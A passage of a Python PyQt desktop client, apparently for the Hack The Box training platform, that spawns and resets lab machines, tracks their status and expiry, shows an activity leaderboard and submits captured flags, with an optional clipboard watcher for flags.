            self._log_to_console("No machine selected", error=True)
            return

        machine_id = self.machine_dict[selected]["id"]
        self.api.stop_machine(machine_id)
        self._log_to_console(f"Stopping machine {selected}...")

    def _handle_stop_result(self, response):
        if response["success"]:
            self._log_to_console(f"Machine {response['machine_id']} stopped")
            self._set_default_status()
        else:
            self._log_to_console(
                f"Error: {response.get('error', 'Unknown error')}", error=True)

    def _reset_machine(self):
        selected = self.machine_combo.currentText()
        if not selected:
            QMessageBox.critical(self, "Error", "Select a machine first")
            return

        machine_id = self.machine_dict[selected]["id"]
        self.api.reset_machine(machine_id)
        self._log_to_console(f"Restarting machine {selected}...")

    def _update_release_timer(self):
        if self.current_machine_data:
            machine_id = self.current_machine_data["id"]
            self.api.get_machine_info(machine_id)
        QTimer.singleShot(15000, self._update_release_timer)

    def _calculate_time_remaining(self, expires_str):
        expires = datetime.fromisoformat(expires_str.replace("Z", "+00:00"))
        now = datetime.now(timezone.utc)
        delta = expires - now
        return f"{delta.days}d {delta.seconds//3600:02}h {(delta.seconds//60) % 60:02}m" if delta.total_seconds() > 0 else "Expired"

    def _time_until_release(self, release_time):
        now = datetime.now(timezone.utc)
        delta = release_time - now

        if delta.total_seconds() <= 0:
            return "¡Released!"

        days = delta.days
        hours, rem = divmod(delta.seconds, 3600)
        minutes, seconds = divmod(rem, 60)
        return f"{days}d {hours:02}h {minutes:02}m {seconds:02}s"

    def _set_default_status(self):
        self._stop_animation()
        for label in self.status_labels.values():
            label.setText("N/A")
        self.copy_ip_btn.setEnabled(False)
        self.current_machine_data = None

    def _copy_payload(self):
        payload = self.payload_text.toPlainText().strip()
        if payload:
            QApplication.clipboard().setText(payload)
            self._log_to_console("Payload copied to clipboard")

    def _load_machines(self):
        self.api.list_machines()

    def _handle_machines_loaded(self, machines):
        try:
            self.machine_dict = {m["name"]: m for m in machines}
            self.machine_combo.clear()
            self.machine_combo.addItems(self.machine_dict.keys())
            
            if self.machine_combo.count() > 0:
                self.machine_combo.setCurrentIndex(0)
                self._on_machine_selected(0)  # Forzar carga inicial
            
            self.payload_ip.setText(get_tun0_ip())
            self._log_to_console(f"Loaded {len(machines)} machines")
        
        except Exception as e:
            self._log_to_console(f"Error loading machines: {str(e)}", error=True)

    def _handle_machine_action(self, action):
        if action == "⟳ Refresh":
            self._load_machines()
        elif action == "▶ Spawn":
            self._spawn_machine()
        elif action == "⏹ Stop":
            self._stop_machine()
        elif action == "🔄 Reset":
            self._reset_machine()

    def _spawn_machine(self):
        selected = self.machine_combo.currentText()
        if not selected:
            QMessageBox.critical(self, "Error", "Select a machine first")
            return

        self._start_animation("Spawning")
        self.copy_ip_btn.setEnabled(False)
        machine_id = self.machine_dict[selected]["id"]
        self.api.activate_machine(machine_id)

        self.status_check_attempts = 0
        self._start_status_check(machine_id)

    def _start_status_check(self, machine_id):

        if self.status_check_timer and self.status_check_timer.isActive():
            self.status_check_timer.stop()

        self.status_check_timer = QTimer()
        self.status_check_timer.timeout.connect(
            lambda: self._check_machine_status(machine_id))
        self.status_check_timer.start(5000)

    def _check_machine_status(self, machine_id):
        self.status_check_attempts += 1

        if self.status_check_attempts > self.max_status_attempts:
            self._stop_animation()
            self.status_check_timer.stop()
            self._log_to_console("Timeout waiting for IP", error=True)
            return

        self.api.get_machine_info(machine_id)

    def _update_status_labels(self, status):
        ip = status.get("ip", "N/A")
        self.status_labels["ip"].setText(ip)

        if ip not in ["N/A", "null", "", None]:
            self._stop_animation()
            self.copy_ip_btn.setEnabled(True)
            if self.status_check_timer:
                self.status_check_timer.stop()

        self.status_labels["name"].setText(status.get("name", "N/A"))
        self.status_labels["type"].setText(status.get("os", "N/A"))

        expires = status.get("playInfo", {}).get("expires_at")
        if expires:
            self.status_labels["expires_at"].setText(
                self._calculate_time_remaining(expires)
            )

    def _handle_spawn_result(self, result):
        if result["success"]:
            self._log_to_console("Spawning machine...")
            self._check_ip_status(result["machine_id"])
        else:
            self._stop_animation()
            self._log_to_console(f"Error: {result['message']}", error=True)
            QMessageBox.critical(self, "Error", result["message"])
            self._set_default_status()

    def _handle_api_error(self, error_msg):
        self._log_to_console(f"API Error: {error_msg}", error=True)
        QMessageBox.critical(self, "Error", error_msg)

    def _check_ip_status(self, machine_id, attempts=0):
        if attempts >= 600:
            return

        self.api.get_machine_status(machine_id)
        QTimer.singleShot(5000, lambda: self._check_ip_status(
            machine_id, attempts + 1))

    def _fetch_activity_data(self, machine_id):
        self.api.get_machine_activity(machine_id)

    def _load_avatar(self, url):
        """Carga la imagen del avatar desde la URL"""
        if not url:
            self.avatar_label.clear()
            return
        
        network_manager = QNetworkAccessManager()
        request = QNetworkRequest(QUrl(url))
        reply = network_manager.get(request)
        
        def handle_reply():
            if reply.error() == QNetworkReply.NoError:
                data = reply.readAll()
                pixmap = QPixmap()
                pixmap.loadFromData(data)
                self.avatar_label.setPixmap(pixmap.scaled(80, 80, Qt.KeepAspectRatio, Qt.SmoothTransformation))
            reply.deleteLater()
        
        reply.finished.connect(handle_reply)

    def _update_avatar(self, data):
        pixmap = QPixmap()
        pixmap.loadFromData(data)
        self.avatar_label.setPixmap(pixmap.scaled(
            50, 50, Qt.KeepAspectRatio, Qt.SmoothTransformation))

    def _start_animation(self, text):
        self.animation_text = text
        self.animation_counter = 0
        self.animation_timer = QTimer()
        self.animation_timer.timeout.connect(self._update_animation)
        self.animation_timer.start(500)

    def _update_animation(self):
        dots = "." * (self.animation_counter % 4)
        self.status_labels["ip"].setText(f"{self.animation_text}{dots}")
        self.animation_counter += 1

    def _stop_animation(self):
        if self.animation_timer:
            self.animation_timer.stop()
            self.animation_timer = None

    def _is_valid_flag(self, text):
        return len(text) == 32 and all(c in "0123456789abcdefABCDEF" for c in text)

    def _setup_clipboard_monitor(self):
        self.clipboard = QApplication.clipboard()
        self.last_clipboard_text = ""
        self.last_flag = ""

    def _check_clipboard(self):
        if not self.auto_submit_enabled:
            return

        text = self.clipboard.text().strip()
        if text != self.last_clipboard_text and self._is_valid_flag(text):
            self._handle_clipboard_flag(text)
        self.last_clipboard_text = text

    def _handle_clipboard_flag(self, flag):
        if self.auto_submit_enabled and flag != self.last_flag:
            self.last_flag = flag
            self.flag_entry.setText(flag)
            self._submit_flag()

    def _update_activity(self):
        try:
            selected = self.machine_combo.currentText()
            if selected:
                machine_id = self.machine_dict[selected]["id"]
                self._fetch_activity_data(machine_id)

            QTimer.singleShot(25000, self._update_activity)
        except Exception as e:
            self._log_to_console(f"Activity error: {str(e)}", error=True)

    def _update_activity_table(self, activity_data):
        self.activity_table.setRowCount(len(activity_data))

        for row, entry in enumerate(activity_data):

            username = entry.get("name", "Unknown")
            if len(username) > 15:
                username = username[:13] + "..."

            user_time = entry.get("user_own_time", "").replace(
                "H", "h ").replace("M", "m ")
            root_time = entry.get("root_own_time", "").replace(
                "H", "h ").replace("M", "m ")

            blood = ""
            if entry.get("is_user_blood"):
                blood += "🩸"
            if entry.get("is_root_blood"):
                blood += "💀"

            items = [
                QTableWidgetItem(str(entry.get("position", "-"))),
                QTableWidgetItem(username),
                QTableWidgetItem(entry.get("rank_text", "-")),
                QTableWidgetItem(user_time),
                QTableWidgetItem(root_time),
                QTableWidgetItem(blood)
            ]

            for item in items:
                item.setForeground(self.palette().text())
                item.setFont(QFont("Iosevka Nerd Font", 11))
                item.setTextAlignment(Qt.AlignCenter)
                item.setFlags(item.flags() ^ Qt.ItemIsEditable)

            if entry.get("is_user_blood"):
                items[-1].setForeground(QColor("#ff4444"))
            if entry.get("is_root_blood"):
                items[-1].setForeground(QColor("#4cc38a"))

            for col, item in enumerate(items):
                self.activity_table.setItem(row, col, item)

    def _toggle_auto_submit(self):
        self.auto_submit_enabled = not self.auto_submit_enabled
        color = "#4cc38a" if self.auto_submit_enabled else "#ff4444"
        self.status_led.setStyleSheet(f"color: {color};")

        if self.auto_submit_enabled:
            self.clipboard_timer = QTimer()
            self.clipboard_timer.timeout.connect(self._check_clipboard)
            self.clipboard_timer.start(1500)
        else:
            if hasattr(self, 'clipboard_timer'):
                self.clipboard_timer.stop()
                del self.clipboard_timer

    def _submit_flag(self):
        selected = self.machine_combo.currentText()
        if not selected:
            QMessageBox.critical(self, "Error", "Select a machine first")
            return

        flag = self.flag_entry.text().strip()
        if not flag:
            QMessageBox.critical(self, "Error", "Enter a flag")
            return

        machine_id = self.machine_dict[selected]["id"]
        self.api.submit_flag(machine_id, flag)

    def _log_to_console(self, message, error=False):
        color = "#ff4444" if error else "#e0e0e0"
        self.console.append(
            f"<span style='color:{color}'> > {escape(message)}</span>")
        self.console.verticalScrollBar().setValue(
            self.console.verticalScrollBar().maximum())


if __name__ == "__main__":
    app = QApplication([])
    font_id = QFontDatabase.addApplicationFont(
        "fonts/IosevkaNerdFont-Regular.ttf")
    if font_id != -1:
        app.setFont(QFont("Iosevka Nerd Font"))

    window = HTBCommander()
    window.show()
    app.exec()
